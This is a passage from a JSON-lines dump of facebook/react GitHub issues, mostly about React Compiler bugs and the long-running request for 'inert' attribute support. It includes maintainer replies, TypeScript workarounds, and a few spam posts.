solution?)\r\n\r\n>We know that this isn't a perfect heuristic\r\n\r\nI assume the current heuristic is designed to avoid false positives. Maybe the compiler could loosen the heuristic to compile all `^use[A-Z]` functions if the current filename has a `.jsx`/`.tsx` extension, on the assumption that if a file has explicitly opted into React syntax, it's unlikely to include non-React code that uses React naming conventions? Still imperfect ofc."}, {"author": "mofeiZ", "body": "I see, you're moving code out of your component / custom hook body, and you'd like React Compiler to apply the same granular memoization to it.\r\n\r\nThe main issue with loosening the heuristic is that false positives currently error at runtime (producing an error like reported in #31802). There are two approaches you could take here:\r\n1. Rename your custom hook-named functions to non-hook names. This will let the compiler memoize your code at the function callsite (within the function body of a hook / component). It also lets you be more flexible with how your function gets called (e.g. it can be dynamically composed, used in a loop, etc).\r\n```js\r\nfunction processData(data) {\r\n  return someExpensiveTransform(data);\r\n}\r\n// caller of processData\r\nfunction MyComponent(props) {\r\n  // React Compiler will memoize this line\r\n  const data = processData(props.data)\r\n```\r\n\r\n2. If you really need to ensure that these functions are memoized, you can annotate them with a `use memo` directive.\r\n```js\r\nfunction useProcessedData(data) {\r\n  'use memo';\r\n  return someExpensiveTransform(data);\r\n}\r\n```\r\n\r\nA major semantic difference between these two approaches is that (2) means that your function is subject to the [rules of hooks and must be pure](https://react.dev/reference/rules#components-and-hooks-must-be-pure)."}, {"author": "anukaal", "body": "The code for the createFastHash function currently uses MD5. To replace MD5 with SHA-256, we can modify the function to use the sha256 algorithm instead. Here's the updated code:\r\n\r\nimport {createHash} from 'crypto';\r\n\r\n// Other imports and code...\r\n\r\nexport function createFastHash(input: string): string {\r\n  const hash = createHash('sha256');\r\n  hash.update(input);\r\n  return hash.digest('hex');\r\n}\r\n\r\n// Rest of the code...``"}, {"author": "AR-Army", "body": "Apk\r\n"}, {"author": "AR-Army", "body": "\r\nUploading 2024-12-15-193920105.mp4\u2026\r\n\r\n"}, {"author": "tusharsnx", "body": "~@mofeiZ I think it wasn't mentioned here (or in the docs) that hooks need to be in a `.tsx` file to be memoizable?~\n\n~I'm seeing an issue where the compiler does not memoize hooks defined in `.ts` files.~\n\nnvm, [it was nextjs](https://github.com/vercel/next.js/issues/78867)."}, {"author": "josephsavona", "body": "@tusharsnx the compiler should be targeting .ts files as well. Can you file a separate issue with more details on your setup?"}, {"author": "tusharsnx", "body": "@josephsavona [It was nextjs](https://github.com/vercel/next.js/issues/78867). Resolved after downgrading to `next@15.2`. Feel free to mark this 'off-topic'."}, {"author": "josephsavona", "body": "Following up here, applying optimizations to all functions that start with \"use\" could break code that isn't meant to be a hook. The existing heuristic is the best compromise we've found. I'm going to close for now."}]}
{"repo": "facebook/react", "issue_number": 32261, "issue_url": "https://github.com/facebook/react/issues/32261", "issue_title": "[Compiler Bug]: \"Ref values (the `current` property) may not be accessed during render\" but there is no value access", "issue_author": "fdelu", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEwBASggIZx4ByEAJggDSkIBmA8gEYBWCVzUMAgCyCDBAFCyrAgF8CrGBAwEAOiBgUq6gNyqAdgYD0RggBU0eADYIAamgYRkBTfoYwwBcgQBuDhBAEAO6WABZeBHiWNgYGeACeWAjm0Xb+EAAKSlieALxEBgQubAD8ztJcvFQAPAASZsIAMvaOAKI2GAj6hAA+BPpQVlYAfHr6RVHWCM5geDBo+gDmY0Vg8DNzC8sGsmMGrFD6VGgQ4xZTLQEAFMSarMyTNsxrcHLO5zaXmdlgAJQF42KeFg4yuhSKBGqdDQPmG4IhkNCAEZhsBHghZNUjMi4YCEcAjAAqAgIMBWBZ4AC00LA5E4Nkp+gQAA8qeSmQRuGBmZTyEikfEjJ1oeRKaFyGBKXByFgoqcCISjLJ4RDqn5HMVWLlgHd5C9tS95EZcQisdDYeDfmNlYZ9CYCMIoHgEABhU5zCBWMDOch0OiebycJ14eUhggYJ3JPChZLqgLFNwITR0AiceIJ9xfWLdRLJR3Ot3dJRerIQHIEfLAcGuTPpZxXO7lNiVPh4OoNZrpdpiLq9fqDEb-XLDFiUGj0BDWvb6A5HOXjfOu93FsA3DNJr5vB2Rwseks-f5VwFwU6zXzpaQVgiCBDSdtNL7dzrdYZXAZDK3ZoqaYEwUEqqEYRNBEiBrDd0iuOMIGkX4bRAyEgzwENbXgopThdck4AAa21K4hxHI9UIhNAZEgi82AAOjgWBXDwf4oOkKiaN7CifE9KBOivAAGFZUNkOCQOA+CI2dFUiixRDkKEyEjHNYDP30G1jFML5GjQWZnDAjwInJM8IBkKDPBCaNw0jVNg1PbMEiSAhVPUvBS3LStwUMgARcg8HIZxiBeDZ5iWHRIlSPytjkABtABdKds1nY55Ts2Ybhc9IwHczyrzCnz1jUEB1AeYKcs3JF1DkCLGB2ZwEocg8ASKE99DPLSADFDjgb0WBPGA6GqWZ-MWZhF13FdHLAML1C0rMQAikd8hvURxDBPECDwitpKKFsqAoxRlFaIs0FJRaiLcjzyAojAZSuK46BO-CCDGpb4OuzyKPRcqHpAhs2Fu6oPjSDU7m1XUiAokGnvII1hjeoiIt+KGQNhlUwuOzyystadvwQX9-yWwCLXe4ANrwCje3mA7mtav4zouq4wte9cYBh1blrE1VBuXT1PCwhB4m1dF5Am9JAa6dwIZZ35YIA2SgLRnZsxZHB8AIBhWHIQZCCqsYQFkIA\n\n### Repro steps\n\n1. Create a component A\n2. Add a prop P to component A. This prop must be a render function that receives a `RefObject` and returns a `ReactNode`\n3. Use the `useRef` hook in component A and initialize it with null\n4. Invoke the render function passed in prop P with the ref from the previous step\n\n**Notes:**\n- I'm not absolutely certain if this is an error on the compiler plugin or if I am not fully understanding what the error is supposed to be. If it is an error on my end, then I would say this error message needs to be improved.\n- The repro link has a complete example of a scenario where this error could arise. The bug itself is only triggered in the `MuteControls` component.\n- The only ref value access in the repro link (`videoRef.current`) is in the `onClick` function of the button in `MuteControls`. Commenting this **does not make the error disappear**, so the error is triggered without any value access\n- Using `useMemo` to memoize the `renderVideo` call does not make the error dissapear neither\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n18.3.1\n\n### What version of React Compiler are you using?\n\neslint-plugin-react-compiler@19.0.0-beta-27714ef-20250124", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler", "Compiler: Ref Validation"], "comments": [{"author": "josephsavona", "body": "Thanks for posting about this. In this case, the compiler cannot know what the `renderVideo(videoRef)` call is doing. It doesn't know whether that function will access the `videoRef.current` or not, but realistically most such functions are likely to do so (if all you can do is store a reference to `videoRef` itself, then there's not much a helper function can do). Therefore, we report an error since you are likely violating the rule about accessing refs during render.\n\nI'll leave this open as a reminder for us to improve the error message to make this more clear."}, {"author": "fdelu", "body": "> Thanks for posting about this. In this case, the compiler cannot know what the `renderVideo(videoRef)` call is doing. It doesn't know whether that function will access the `videoRef.current` or not, but realistically most such functions are likely to do so (if all you can do is store a reference to `videoRef` itself, then there's not much a helper function can do). Therefore, we report an error since you are likely violating the rule about accessing refs during render.\n> \n> I'll leave this open as a reminder for us to improve the error message to make this more clear.\n\nSounds good. As a workaround then, I'll pass the child component type as a prop instead of passing a render function. Thank you for the explanation!"}, {"author": "josephsavona", "body": "Thanks again for reporting! Note that you can now pass refs to functions if their result is directly interpolated into JSX, so the original `<div>{renderVideo(ref)}</div>` call is now allowed in your example. There's a different issue where the compiler thinks a value is getting mutated and it can't preserve memoization, but the original ref issue is fixed. I'll leave this open because the example seems like it should compile. https://github.com/facebook/react/pull/34006 for the ref fix though."}, {"author": "josephsavona", "body": "I'm moving the memoization issue to #34232 and closing this since the ref thing is fixed. Thanks again for posting!"}]}
{"repo": "facebook/react", "issue_number": 33196, "issue_url": "https://github.com/facebook/react/issues/33196", "issue_title": "[Compiler Bug]: Compiler errors when optimizing component with spread assignment in `if` in `while` loop", "issue_author": "kumpelstachu", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEUYCAKgmDgIwAUAlEcADrFFyHVEBuAhgBsoCIgF4SZAGqDhjNmyJEYCHLGJ0+MAOZgmogHzMFiogHcAFngEi6OGMKat2JogBMIAZQgBbFZcxaGtq6xi4A9GFEAHQxoSZ4aERBOgD8UQAOMBDpjnHhkXB8pFRECDBZMHkmmjpizNExNWAANESZ2ci8MiIAvlV9zkQDigMDbBjY+IQSFFQ4AEyMRuycmNz8QiLixdKbcpjGyqow6k16hk4uFlY2dg7LLoruXr44-oFnVRENUVUJSU00u0cg9HopvqYIDAANZgKqKJoZLLpOobYT9OLDIZsMaYCa4AjEYqUagAZiWlw4XBwXU2dR23X2hxUagBwXOoMU12sSTuCFygyenh8fjwAWSIUFRG+MV+UohUNhVSadWAPyarWBnTRvUxxlGIB6QA\n\n### Repro steps\n\nReact compiler fails to optimize components like this: \n```js\nfunction Component() {\n  const value = useValue()\n\n  const fn = (args) => {\n    while (true) {\n      // do something with args\n      // ...\n\n      // \u2705 works outside of if\n      args = { ...args, prop: value }\n\n      if (args?.prop) {\n        // \u2705 works when assigning prop directly\n        args.prop = value\n\n        // \ud83d\udc47 Invariant: Invalid mutable range for scope. Scope @0 has range [0:21] but the valid range is [1:25]\n        args = { ...args, prop: value }\n      }\n    }\n  }\n\n  // ...\n}\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.0.0\n\n### What version of React Compiler are you using?\n\n19.1.0-rc.1", "issue_labels": ["Type: Bug", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Nice find, thanks for filing a bug!"}, {"author": "josephsavona", "body": "This got fixed along the way, I think w the new mutation/aliasing model."}]}
{"repo": "facebook/react", "issue_number": 34180, "issue_url": "https://github.com/facebook/react/issues/34180", "issue_title": "[Compiler Bug]: atomic.ai", "issue_author": "epicoracle1-droid", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [x] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [x] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\npublic GitHub repo\n\n### Repro steps\n\n[dumpstate-stats.txt](https://github.com/user-attachments/files/21725031/dumpstate-stats.txt)\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nv19.1\n\n### What version of React Compiler are you using?\n\nv19.1", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "epicoracle1-droid", "body": "Use Markdown for formatting \n\n[bugreport-A56-T00624-2025-08-10-17-37-18-dumpstate_log-5822.txt](https://github.com/user-attachments/files/21725039/bugreport-A56-T00624-2025-08-10-17-37-18-dumpstate_log-5822.txt)"}, {"author": "josephsavona", "body": "This really looks like spam. If you have more details and a repro, feel free to open a new issue with that information. "}]}
{"repo": "facebook/react", "issue_number": 34131, "issue_url": "https://github.com/facebook/react/issues/34131", "issue_title": "[Compiler Bug]: (BuildHIR::lowerStatement) Handle TryStatement with a finalizer ('finally') clause", "issue_author": "Tarasikee", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [x] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAMygOzgFwJYSYAEAogB4CGAtgA4A2CAFAJRHAA6xRG2+hROBGBws2nIhIEwAnmMzjJAXyJwKOOAAs5CicrR5MFOnVkd5XXQsUKFMBDljFGOogB4AJngBuRQgGE6PDgAawBeYEFhRQA+FwkACQRjCCIAdwgYOnciF1cAek8vWK5mAG5ORRBFIA\n\n### Repro steps\n\nReact compiler breaks when using `finally` clause. I am not sure whether it is a bug or it's meant to be like this. When I was skimming trough code of the compiler I came across this code in `BuildHIR.ts`.\n\nhttps://github.com/facebook/react/blob/main/compiler/packages/babel-plugin-react-compiler/src/HIR/BuildHIR.ts#L1284-L1291\n<img width=\"843\" height=\"163\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/9fdb1b9d-8b39-4114-89c2-863211b70fe4\" />\n\nMy question is whether this is just not implemented or whether it meant to be like this. If this implementation is correct, maybe you could suggest an eslint rule I can use to prevent having `finally` clause. Is it me who does something wrong?\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19\n\n### What version of React Compiler are you using?\n\nrc", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. This is a known todo, we haven\u2019t added support for this feature yet. The `finally` clause in try/catch has complex control flow and is rarely used, so this is lower on our priority list. By default the compiler will not report these (eg in ESLint) and just skip the component, since there is nothing actionable on your part here. Did you opt in to showing all errors?"}, {"author": "Tarasikee", "body": "Thanks for a quick answer. I was more curious about it because what I saw in logger: \n```\nCompilation failed: /path/to/component/Name.tsx\nReason: (BuildHIR::lowerStatement) Handle TryStatement with a finalizer ('finally') clause\n```\nThanks for clarification, will keep it in mind\n\n"}]}
{"repo": "facebook/react", "issue_number": 17157, "issue_url": "https://github.com/facebook/react/issues/17157", "issue_title": "[DOM] Add support for the `inert` attribute", "issue_author": "kripod", "issue_body": "<!--\r\n  Note: if the issue is about documentation or the website, please file it at:\r\n  https://github.com/reactjs/reactjs.org/issues/new\r\n-->\r\n\r\n**Do you want to request a *feature* or report a *bug*?**\r\n\r\nFeature\r\n\r\n**What is the current behavior?**\r\n\r\nWhen specifying `inert={false}` on an element, React throws the following message:\r\n\r\n```\r\nWarning: Received `false` for a non-boolean attribute `inert`.\r\n```\r\n\r\nHowever, `inert={undefined}` works fine as a replacement for `false`, while `inert=\"\"` (empty string) provides an escape hatch as a truthy value.\r\n\r\n**What is the expected behavior?**\r\n\r\nThe `inert` attribute should be accepted as a boolean DOM attribute, as [proposed](https://html.spec.whatwg.org/multipage/interaction.html#inert) by the HTML Standard.\r\n", "issue_labels": ["Type: Bug", "Component: DOM", "Status: Unconfirmed"], "comments": [{"author": "kripod", "body": "Also, type declarations are [required](https://github.com/DefinitelyTyped/DefinitelyTyped/issues/39289) for TypeScript development, so `DOMAttributes` and `JSX.IntrinsicAttributes` should also be updated."}, {"author": "aweary", "body": "@kripod it looks like the spec doesn't explicitly define an `inert` attribute yet\r\n\r\n> This section **does not** define or create any content attribute named \"inert\". This section merely defines an abstract concept of inertness.\r\n\r\nWe should probably wait until the spec defines this as a boolean attribute before adding it to the list. In the meantime the workaround you mentioned with `inert=\"\"` should be sufficient!\r\n\r\n\r\n\r\n"}, {"author": "stale[bot]", "body": "This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. Thank you for your contribution.\n"}, {"author": "stale[bot]", "body": "Closing this issue after a prolonged period of inactivity. If this issue is still present in the latest release, please create a new issue with up-to-date information. Thank you!\n"}, {"author": "MidnightDesign", "body": "The `inert` attribute will be [supported by all major engines](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/inert#browser_compatibility) very soon and this issue should be reopened."}, {"author": "eps1lon", "body": "Seems like `inert` in React does not match `<div inert=\"\" />` in HTML: https://codesandbox.io/s/react-inert-lb4beo?file=/src/index.js"}, {"author": "jfbrennan", "body": "Trying to use `inert` today and... no surprise React once again won't let me use completely valid vanilla HTML features\ud83e\udd26\u200d\u2642\ufe0f \r\n\r\nWhen your framework is perpetually struggling to be compatible with the web that's kind of sign, right? Can we get #24730  merged please!"}, {"author": "kripod", "body": "@jfbrennan behind every framework we use, there are human beings with feelings. No one forces you to use React as-is: you could either fix in on your own through a fork or use another library. Please be respectful to the maintainers and evaluate your own contributions before blaming anyone.\r\n\r\nI\u2019ve got tired of open source due to the attitude shown above. As a community, I think we should call this behavior out and remind consumers to be grateful towards contributors."}, {"author": "jfbrennan", "body": "@kripod oh I understand and I'm with you about respecting and collaborating with open-source folks. But let's not get it twisted, React is totally different."}, {"author": "mrienstra", "body": "Workaround (thank you @kripod!): https://github.com/DefinitelyTyped/DefinitelyTyped/issues/39289#issue-509909553\r\n\r\n> [...] the following has to be added into a project-specific `declarations.d.ts` file:\r\n> \r\n> ```ts\r\n> declare module 'react' {\r\n>   interface DOMAttributes<T> {\r\n>     inert?: '' | undefined;\r\n>   }\r\n> }\r\n> \r\n> declare global {\r\n>   namespace JSX {\r\n>     interface IntrinsicAttributes {\r\n>       inert?: '' | undefined;\r\n>     }\r\n>   }\r\n> }\r\n> \r\n> export {};\r\n> ```\r\n\r\nEdit: if you run into:\r\n> 'T' is defined but never used. eslint[@typescript-eslint/no-unused-vars](https://typescript-eslint.io/rules/no-unused-vars)\r\n\r\n... fixes include:\r\n1. `interface HTMLAttributes<T> extends AriaAttributes, DOMAttributes<T>` (use the var)\r\n2. `interface DOMAttributes` or `interface HTMLAttributes` (drop `<T>`)\r\n3. `// eslint-disable-next-line @typescript-eslint/no-unused-vars` (ignore rule just on that line)\r\n\r\nI'm not 100% sure which option is best, I'm going with \"1\" for now. Your mileage may vary, I'm using `react` `18.2.0`, `eslint` `8.47.0`, & `@typescript-eslint` `6.4.0`"}, {"author": "jfbrennan", "body": "Yeah, I used to be compelled to workaround IE too. I already stuck this hack into our app and moved on (not the first time).\r\n\r\nThis is absolutely a step backwards for the frontend community and we all know it. This kind of thing should have died with IE never to be tolerated again. It's been 3.5 years since this issue was opened - ample time to get React prepared for the day when browsers support this attribute (not to the mention error of a design that requires a framework to be maintained alongside the HTML spec). \r\n\r\nReact is a corporate project with a multi-million dollar budget and highly paid full-time maintainers. Again, really great people just like the old IE team, but it is unacceptable to drag your feet for over 3 years on web standards like this and other instances. Not to mention the persistent failure to support Web Components.\r\n\r\nThe PR is there - has been for a year - and here we are adding 13 lines of TS to make HTML's `inert` work. \ud83d\ude2b"}, {"author": "pauldraper", "body": "> you could either fix in on your own through a fork \r\n\r\nNamely the fork https://github.com/eps1lon/react/tree/feat/inert\r\n\r\nHopefully, the react project will find this suitable for merging in #24730"}, {"author": "pauldraper", "body": "Workaround (JS):\r\n\r\n```jsx\r\n<div inert=\"\" />\r\n```\r\n\r\nWorkaround (TS):\r\n\r\n```tsx\r\n<div {...{inert:\"\"}} />\r\n```"}, {"author": "Benimation", "body": "I'm currently using it like this:\r\n\r\n```\r\n<div\r\n  inert={isShown ? undefined : ''} // React doesn't support inert yet\r\n/>\r\n```\r\n\r\nWould be nice if it could be supported by default, though.\r\n"}, {"author": "0x00000001A", "body": "4 years issue for the native html attribute, cmon"}, {"author": "effulgentsia", "body": "In 2019, @aweary wrote:\r\n> We should probably wait until the spec defines this as a boolean attribute before adding it to the list.\r\n\r\nWhich I think was quite sensible. I don't know when exactly this changed, but as of now it looks like [the HTML spec officially defines it as a boolean](https://html.spec.whatwg.org/multipage/interaction.html#the-inert-attribute)."}, {"author": "johann1301s", "body": "When I, as of 2024 January 18, go to [canisue](https://caniuse.com/mdn-html_global_attributes_inert), it seems that all browsers support the `inert` attribute.\r\n\r\nCaniuse also links to the [specification for inert](https://html.spec.whatwg.org/multipage/interaction.html#the-inert-attribute).\r\n\r\nIt seems like its time to add support for `inert` at this time in react?\r\n\r\n<img width=\"1197\" alt=\"Skjermbilde 2024-01-18 kl  10 56 59\" src=\"https://github.com/facebook/react/assets/25029220/8eba1d21-57d6-4f4a-abd5-1497d0f6eb21\">"}, {"author": "jfbrennan", "body": "@johann1301s, it's gotten better over the years, but React's design effectively makes it a browser and needs its own column on caniuse. I originally opened this request as a troll, but your comment and all the frequent disappointment here makes me think we might need to take this more seriously https://github.com/Fyrd/caniuse/issues/6699\r\n\r\nA framework should not be a web standards gatekeeper - that was IE's job!"}, {"author": "eps1lon", "body": "`boolean` values for `inert` landed in the Experimental release channel (`react-dom@experimental`). `inert=\"\"` will then be treated as `false` instead of `true` in experimental builds. We plan to land it in stable in React 19. "}, {"author": "Cuuki", "body": "Hi @eps1lon, we just got an update for the `@types/react` package for patch version [18.2.67](https://renovatebot.com/diffs/npm/@types%2freact/18.2.65/18.2.67) from Renovate. We are using `inert` as type `'' | undefined` so we had some type failures after the update since the attribute now expects `boolean | undefined`. Unfortunately, React 18 doesn't add the attribute to the DOM node with `inert={true}`.\r\n\r\nAs you mentioned this was only meant for experimental and stable in React 19 so the patch version bump is incorrect or at least doesn't work as expected \ud83e\udd14 . This would rather be a breaking change that should only be included in `@types/react@>=19`. I am uncertain how the type packages are handled regarding SemVer and the actual react package version, this would just be my expectation as a consumer.\r\n\r\nWe have pinned the `@types/react` package to `18.2.66` in the meantime. I just found this issue and the recent activity and thought you might want to know! \ud83d\ude42 "}, {"author": "eps1lon", "body": "@Cuuki Something in your app is pulling in types for the `experimental` release channel e.g. a `import react/experimental` or `/// <reference types=\"react/experimental\" />` somewhere in your app.\r\n\r\nThe stable types do not have types for `inert`. I'd need a full repro to see the issue. But we defintiely didn't add the types for `inert` in stable types"}, {"author": "benface", "body": "I confirm I have the same issue as @Cuuki and I am definitely not importing `react/experimental`.\r\n\r\nEDIT: Though maybe Next.js, which I use, is doing it?"}, {"author": "eps1lon", "body": "I think I did that in Next.js for convenience a while ago not realizing they vendor Canary not Experimental. I'll check how we can fix it. Might need to break users of experimental features.\r\n\r\nI recommend upgrading and annotating breakages with `@ts-expect-error`."}, {"author": "Cuuki", "body": "We are authoring a component library with multiple packages in a monorepo, other than `emotion` and `react-aria` we don't depend on much here. So at least in this context, Next.js is only used in one of the example apps, outside of the library scope where the error was thrown.\r\n\r\nI had already checked for experimental occurence usage earlier but it could of course be that some of the dependencies pull in the experimental types but I can't be sure. If I find some time in the upcoming days I can try to analyze this further, in the meantime I will go with the `@ts-expect-error` suggestion - thank you! \ud83d\ude4f\ud83c\udffb "}, {"author": "lgenzelis", "body": "Same happening here (I'm also using NextJs, so there's definitely a pattern here). We have very strict rules agains using `@ts-expect-error`, so for now I disabled the updates for `@types/react`, no problem.  :) "}, {"author": "thathurtabit", "body": "Should this issue be reopened until React 19? \ud83e\udd37  [i.e. this comment](https://github.com/facebook/react/issues/17157#issuecomment-2003750544)"}, {"author": "h3rmanj", "body": "@eps1lon \r\n> `boolean` values for `inert` landed in the Experimental release channel (`react-dom@experimental`). `inert=\"\"` will then be treated as `false` instead of `true` in experimental builds. We plan to land it in stable in React 19.\r\n\r\nWe shipped the `inert ? \"\" : undefined` workaround in a library. Is it possible for us to still support both React v18 and v19 at the same time? Does react 19 ship something we can detect and then change behavior based on that?\r\n\r\ncc @xec"}, {"author": "eps1lon", "body": "> Does react 19 ship something we can detect and then change behavior based on that?\r\n\r\nOther maintainers check for existence of `React.use` since that exists in 19 but 18."}, {"author": "filipw01", "body": "> inert=\"\" will then be treated as false instead of true in experimental builds. We plan to land it in stable in React 19.\r\n\r\nWould `inert=\"anyNonEmptyString\"` be treated as true in React 19? That would allow it to work in both React 18 and React 19"}, {"author": "eps1lon", "body": "> Would inert=\"anyNonEmptyString\" be treated as true in React 19? That would allow it to work in both React 18 and React 19\r\n\r\nFor now but no guarantees that it won't break later. 3rd party tooling may complain about non-standard values."}]}
{"repo": "facebook/react", "issue_number": 34054, "issue_url": "https://github.com/facebook/react/issues/34054", "issue_title": "Using `use()` as name for custom hooks", "issue_author": "EricPierlotIdmog", "issue_body": "### What kind of issue is this?\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n[https://playground.react.dev](https://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEASggIZx4A0BwBcMZeCAwhAHZMAeVBUYL7Ljz4IAynlJMCAXwIAzGBAwEA5A3J4VAbgA6bPXHZhCAWQgATUgBtWHBNwIBeOuqa2hBADw09BAmjAAeSwENmQCACMICCsyNl02PwgQsIIACgBKJwA+AgA3CDRzBL84Kwh+cMyc-MLivVkAH142cwQ5NDYEcwJctKhW9s7ujISDI0IRM0srJ3Ssx1zgXzoJ1bsHZxF3ezw06esd7lGVtDl0gEJDDbws5cS-AjwAC0UAdwIuj4BRGEUYNIqKYWawEDB8QgRBC8fg9N5oF6dAgHKwABUUeSKCBgKhOD2kKwYeFgiWuQgS0jGbGuxmRILRGKxMDmaVocGeaCs5gYiWkCyWKxphAA2gFgqFqPw8ABJIIpAC6cxE4kkCDScms-DxgqMMQQADpygBzQHoiCYtrMnmWggAWn8ctCyBU1DFKW1DyF+WsUGhznujwd4rYlBWSRSVX5PgegZpesNEBNKmSoWqcGssXMuJKgYIUtlwbSeBgvrxgekoZjdHKlXmNQDubjsQTSbKFTVWXTVkz2bDj3zjrY6s1CDLjwrK0pekJCGJMESaT7nhRRzw+rNFux3qsvscwDyPoQ0myfb8wHZnO5oQJVc8AHoV4JduvGZaTw88VP9NS1iiACJoNYiYslGDZemyNYIK6g4yHMKL6iImQ5k2BrGoCAFAUaBDWlu9puk6LpBu6VJ+ESJJEaEBAAPzpEu5hoHkeZ4AAnrEe60FEMCWuEKgAIxYJweYxEU2HdIRWCkOY9FsEaPEAEwAAwCSoMjHqeXjPHJ2Qog6BApmwFz3pp765l4ERQHgeDsHpbDMFYaBwAA1nubb8Medntve5mWewJmPPe9F5H5WRVHRDHafSumud0AXhSsn5Uned4EAAKgAEt8BCokQgQAEIADLfCYACCKXSswBAAHLFSY3yiKixXMJl3wABqooERApXo9g4Pg6y0jp-orBuTLhCiI2WpWfgiOEwIzFNMIICiC0YcaY30qtiaVl+ehyAMFBoNZxVYFg1RgWstD6bBzjwYhHqkbO5GLregVMaxCDsQQElSZ0smqIpymqX5gaeM8vHZCQGgEKw2Ccluq4ELlUBGkZ4PqZ43lWYk7B2Q5znAPpx7BnSMxeRZWPA-5ETMne2QYzTlN+Mu9L6ptWG00ud6BcFFLTl0nC9YQbQalAViEHt1J4IdiRENEex3DOc4Lku8ETdijNeMdWAEBzt4PizaswDzDQgNIQA)\n\n## Bug Description\n\nContext providers update state correctly, but consumers receive stale values when using React Compiler. Works without the compiler.\n\n**Repro:** Click \"Open Dialog\" button\n**Expected:** Dialog shows \"Modal open!\"  \n**Actual:** Dialog stays \"Modal is closed\" despite provider logging `isOpen: true`\n\n## Root Cause\n\nThe React Compiler incorrectly optimizes hooks called through namespace exports with `.use()` property names:\n\n**Broken:** `Modal.use()` \u2192 Entire hook result cached, never re-evaluated\n```tsx\n// Compiled output - WRONG\nconst ModalDialog = () => {\n  let t0;\n  if ($[0] === Symbol.for(\"react.memo_cache_sentinel\")) {\n    t0 = Modal.use(); // Only called once\n    $[0] = t0;\n  } else {\n    t0 = $[0]; // Uses stale cached value\n  }\n  const { close, isOpen } = t0;\n```\n\n**Working:** `Modal.useModal()` \u2192 Individual values tracked correctly  \n```tsx\n// Compiled output - CORRECT\nconst ModalDialog = () => {\n  const { close, isOpen } = Modal.useModal();\n  if ($[0] !== close || $[1] !== isOpen) { // Proper dependency tracking\n    $[0] = close;   \n    $[1] = isOpen;\n  }\n```\n\n## Workaround\nUse any property name other than `.use()` in namespace exports.\n\n### How often does this bug happen?\nEvery time\n\n### What version of React are you using?\n19.1.0\n\n### What version of React Compiler are you using?\n19.1.0-rc.2", "issue_labels": ["Type: Question"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. `use` is not a valid name for custom hooks, and is only meant for the specific `use()` API provided by React. You can think of `use()` more like an keyword or operator than a hook (the closest analogue is `await`). So we would recommend either creating a hook named accordingly, or `import {use} from 'react'`. "}, {"author": "Shonferns004", "body": "Hello! \ud83d\udc4b I came across issue and would love to work on this. I\u2019ve set up the repo locally and started digging into it.\n\nJust wanted to check in before starting \u2014 is anyone already working on this? If not, I\u2019d love to take it up.\n\nThanks!"}]}
{"repo": "facebook/react", "issue_number": 34056, "issue_url": "https://github.com/facebook/react/issues/34056", "issue_title": "[Compiler Bug]:", "issue_author": "yahya9-c", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nzez\n\n### Repro steps\n\n\"d\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1\n\n### What version of React Compiler are you using?\n\n19.1", "issue_labels": ["Type: Bug", "Status: Unconfirmed"], "comments": []}
